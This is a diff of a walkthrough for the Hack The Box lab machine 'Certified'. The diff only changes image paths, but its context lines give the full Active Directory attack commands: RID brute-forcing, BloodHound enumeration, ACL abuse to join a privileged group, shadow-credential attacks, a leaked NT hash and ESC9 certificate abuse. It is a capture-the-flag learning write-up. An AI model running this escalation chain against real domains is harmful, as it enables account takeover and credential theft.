@@ -15,11 +15,11 @@ Password: judith09**
 
 > **RUN:** **nmap -sV -Pn 10.10.11.41 \<- this did not start**
 >
-> ![](images/media/image1.png)
+> ![](Certified/media/image1.png)
 
 3.  **Rerun** with verbose set. **RUN:** **nmap -sV -Pn -v 10.10.11.41**
 
-> ![](images/media/image2.png)
+> ![](Certified/media/image2.png)
 >
 > OR
 >
@@ -36,7 +36,7 @@ Password: judith09**
 > **INFO: By pushing SPACE key during scan, you can see what's
 > going on during the scans**
 >
-> ![](images/media/image3.png)
+> ![](Certified/media/image3.png)
 
 4.  **Get all User names**
 
@@ -49,7 +49,7 @@ Password: judith09**
 > **RUN:** **crackmapexec smb certified.htb -u \"judith.mader\" -p
 > \"judith09\" \--rid-brute \| grep SidTypeUser**
 >
-> ![](images/media/image4.png)
+> ![](Certified/media/image4.png)
 
 5.  **Bloodhound**
 
@@ -61,7 +61,7 @@ Password: judith09**
 > **RUN: bloodhound-python -u judith.mader -p \'judith09\' -c All -d
 > certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image5.png)
+> ![](Certified/media/image5.png)
 >
 > **Error: Failed to get Kerberos TGT**
 >
@@ -74,27 +74,27 @@ Password: judith09**
 > **1^st^ Rerun:** **bloodhound-python -u judith.mader -p \'judith09\'
 > -c All -d certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image6.png)
+> ![](Certified/media/image6.png)
 >
-> ![](images/media/image7.png){width="5.0in"
+> ![](Certified/media/image7.png){width="5.0in"
 > height="1.462810586176728in"}
 >
 > **(this fixed the ERROR) RUN:** **sudo ntpdate 10.10.11.41**
 >
-> ![](images/media/image8.png)
+> ![](Certified/media/image8.png)
 >
 > **WORKING** (NO ERRORS) at **2^nd^ Rerun**:
 > **bloodhound-python -u judith.mader -p \'judith09\' -c All -d
 > certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image9.png)
+> ![](Certified/media/image9.png)
 
 6.  Import all JSON-files into BloodhoundGUI for analysis
 
 > **INFO:** The JSON-files will be located in the same directory, as the
 > Terminal was started in.
 >
-> ![](images/media/image10.png)
+> ![](Certified/media/image10.png)
 >
 > Bloodhound missing? -\> installation GUIDE
 > <https://www.kali.org/tools/bloodhound/>
@@ -110,11 +110,11 @@ Password: judith09**
 >
 > Drag & Drop JSON files. Go to Analysis TAB or search directly
 >
-> ![](images/media/image11.png)
+> ![](Certified/media/image11.png)
 >
 > **Direct search**. Type user:USERNAME or group:GROUPNAME
 >
-> ![](images/media/image12.png)
+> ![](Certified/media/image12.png)
 >
 > **IMPORTANT:** Generic All, Generic Write relations should be
 > displayed
@@ -124,7 +124,7 @@ Password: judith09**
 > Judith can change OWNER of a group, or modify **ACL Access Control
 > List**
 >
-> ![](images/media/image13.png)
+> ![](Certified/media/image13.png)
 
 8.  Check
     [**management@certified.htb**](mailto:management@certified.htb)
@@ -132,24 +132,24 @@ Password: judith09**
 > **INFO: Generic Write**: The management group **can write to the
 > SVCs**.
 >
-> ![](images/media/image14.png)
+> ![](Certified/media/image14.png)
 >
 > **Management** has FULL CONTROL (Generic All) over **Management_SVC**
 >
-> ![](images/media/image15.png)
+> ![](Certified/media/image15.png)
 
 9.  Check
     [**management_SVC@certified.htb**](mailto:management_SVC@certified.htb)
 
-> ![](images/media/image16.png)
+> ![](Certified/media/image16.png)
 >
 > **Management_SVC** has FULL CONTROL (Generic All) over **CA_Operator**
 >
-> ![](images/media/image17.png)
+> ![](Certified/media/image17.png)
 
 10. Lone's overview INFO: Look for Domain Controller
 
-> ![](images/media/image18.png)
+> ![](Certified/media/image18.png)
 
 **[User - Foothold]{.underline}**
 
@@ -163,9 +163,9 @@ Password: judith09**
 > \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
 > Mader,CN=Users,DC=certified,DC=htb\"**
 >
-> ![](images/media/image19.png)
+> ![](Certified/media/image19.png)
 >
-> ![](images/media/image20.png)
+> ![](Certified/media/image20.png)
 
 2.  Add **Generic All for Judith.Mader on MANAGEMENT**
 
@@ -174,9 +174,9 @@ Password: judith09**
 > \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
 > Mader,CN=Users,DC=certified,DC=htb\"**
 >
-> ![](images/media/image21.png)
+> ![](Certified/media/image21.png)
 >
-> ![](images/media/image22.png)
+> ![](Certified/media/image22.png)
 
 3.  Add **Group Member**
 
@@ -187,7 +187,7 @@ Password: judith09**
 > \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
 > Mader,CN=Users,DC=certified,DC=htb\"**
 >
-> ![](images/media/image23.png)
+> ![](Certified/media/image23.png)
 
 4.  Add **Judith.Mader to the Management group**
 
@@ -198,7 +198,7 @@ Password: judith09**
 > \"certified.htb\"/\"judith.mader\"%\"judith09\" -S
 > \"DC01.certified.htb\"**
 >
-> ![](images/media/image24.png)
+> ![](Certified/media/image24.png)
 
 5.  **Check** if User Judith.mader is **member of Management group**
 
@@ -207,7 +207,7 @@ Password: judith09**
 > **RUN:** **net rpc group members \"MANAGEMENT\" -U
 > \"certified.htb\"/\"judith.mader\" -S \"certified.htb\"**
 >
-> ![](images/media/image25.png)
+> ![](Certified/media/image25.png)
 
 6.  This command uses **certipy-ad** to perform a **\"shadow credential
     attack\" against the management_svc account** in the certified.htb
@@ -220,7 +220,7 @@ Password: judith09**
 > **RUN:** **certipy-ad shadow add -u \"judith.mader@certified.htb\" -p
 > \'judith09\' -account \"management_svc\" -ns 10.10.11.41**
 >
-> ![](images/media/image26.png)
+> ![](Certified/media/image26.png)
 
 7.  TGT: Then **request the TGT ticket, using certificate for
     MANAGEMENT_SVC account**. If an error occurs, use ntpdate to
@@ -246,7 +246,7 @@ Password: judith09**
 >
 > **Minikerberos : AS-REP encryption key**
 >
-> ![](images/media/image27.png)
+> ![](Certified/media/image27.png)
 
 8.  Get **NT-HASH (NTLM)**
 
@@ -269,7 +269,7 @@ Password: judith09**
 >
 > **Solution:** Resync clock, see screenshot below.
 >
-> ![](images/media/image28.png)
+> ![](Certified/media/image28.png)
 
 9.  With NThash, you can use **REMOTE TOOL to LOGIN REMOTELY** (USER:
     management_svc)
@@ -320,7 +320,7 @@ Password: judith09**
 > **RUN: certipy-ad shadow auto -u management_svc@certified.htb -hashes
 > a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -ns
 > 10.10.11.41**
-> ![](images/media/image29.png)
+> ![](Certified/media/image29.png)
 >
 > INFO: If not working, use NTP to synchronize your machine\'s clock
 >
@@ -364,7 +364,7 @@ STEP 8**
 >
 > Solution: **Repeat command from STEP 7**
 >
-> ![](images/media/image30.png)
+> ![](Certified/media/image30.png)
 
 8.  Then, we **change** **back** the **userPrincipalName** of
     **ca_operator to be something else**, like her original
@@ -375,7 +375,7 @@ STEP 8**
 > \':a091c1832bcdd4677c28b5a6a1295584\' -user ca_operator -upn
 > ca_operator@certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image31.png)
+> ![](Certified/media/image31.png)
 
 
 11. Now, if we **try to authenticate with the certificate**, we will
@@ -396,7 +396,7 @@ STEP 8**
 > **RUN:** **certipy-ad find -u judith.mader@certified.htb -p judith09
 > -dc-ip 10.10.11.41**
 >
-> ![](images/media/image32.png)
+> ![](Certified/media/image32.png)
 
 13. NoSecurityExtension exists, see screenshot, so **ESC9 can be used to
     attack**.
